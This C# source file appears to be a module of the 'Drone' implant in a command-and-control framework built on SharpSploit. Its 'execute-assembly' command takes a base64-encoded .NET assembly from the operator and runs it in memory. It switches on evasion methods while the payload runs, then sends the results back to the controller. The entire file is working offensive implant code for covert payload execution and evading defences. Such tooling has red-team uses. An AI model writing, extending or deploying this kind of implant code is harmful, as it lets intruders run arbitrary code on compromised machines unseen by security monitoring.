using System;
using System.IO;
using System.Text;
using System.Threading;

using Drone.Models;
using Drone.SharpSploit.Execution;

namespace Drone.Modules
{
    public class AssemblyModule : DroneModule
    {
        public override string Name { get; } = "assembly";
        
        public override void AddCommands()
        {
            var exec = new Command("execute-assembly", "Execute a .NET assembly in memory", ExecuteAssembly);
            exec.Arguments.Add(new Command.Argument("/path/to/assembly.exe", false, true));
            exec.Arguments.Add(new Command.Argument("args"));
            
            Commands.Add(exec);
        }

        private void ExecuteAssembly(DroneTask task, CancellationToken token)
        {
            Evasion.DeployEvasionMethods();

            var asm = Convert.FromBase64String(task.Artefact);
            var result = Assembly.Execute(asm, task.Arguments);

            Evasion.RestoreEvasionMethods();
            Drone.SendResult(task.TaskGuid, result);
        }
    }
}